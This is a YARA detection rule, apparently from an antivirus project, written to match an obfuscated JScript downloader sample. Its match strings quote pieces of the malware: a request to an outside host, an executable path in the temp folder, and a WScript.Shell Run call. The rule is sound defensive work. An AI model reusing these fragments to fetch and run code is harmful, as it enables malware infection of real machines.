rule sig_20160328_ed53e60d8a9cf3309388e3a829e77d59 {
  meta:
    description = "datamaliciousorder - file 20160328_ed53e60d8a9cf3309388e3a829e77d59.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bade683909b2532e94012edd9631cb0788239018ad69d67b1efee2c936922f5e"

  strings:
    $s1  = "function Pghhgvd() {return Lniidpy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vFs3fajbsesc9o.exe\";};" fullword ascii
    $s2  = "Lfqmxz[Ofhdmbtg](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Sqpzwnnrdn](Arqzxwvjdy() * 11)} while (Lfqmxz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Lniidpy = function Fagwyjmik() {return WScript[Xvefmp](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Indmjjrqb(Wjphmzlji, Yyyfaxcno){return Wjphmzlji - Yyyfaxcno;};" fullword ascii
    $s6  = "function Xjkslowcn() {return ((Ienwe == true) && (Ienwe == Euksgljmp)) ? 1 : Nlzefall;};" fullword ascii
    $s7  = "function Bfhfaichzl(Cmkhsvj){Lniidpy[\"Run\"](Cmkhsvj, Nlzefall, Nlzefall);};" fullword ascii
    $s8  = "Ienwe = true; " fullword ascii
    $s9  = "function Toxdrnkhmq()" fullword ascii
    $s10 = "var Ienwe = false;" fullword ascii
    $s11 = "function Arqzxwvjdy(){return 22;};" fullword ascii
    $s12 = "function Exltzpktdx(Ohefu) {var Gbsgwgudep = (1, 2, 3, 4, 5, Ohefu); return Gbsgwgudep;};" fullword ascii
    $s13 = "var Kqrnjfp = new this[\"Date\"]();" fullword ascii
    $s14 = " while (Goeog){" fullword ascii
    $s15 = "var Euksgljmp = false;" fullword ascii
    $s16 = "return Indmjjrqb(Uytvp, Hbhpnfp);" fullword ascii
    $s17 = "function Svcchq(){return Xvefmp;};" fullword ascii
    $s18 = "var Ojglqtwzh = false;" fullword ascii
    $s19 = "Euksgljmp = true; " fullword ascii
    $s20 = "function Qumgfd(){return Nfsks;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}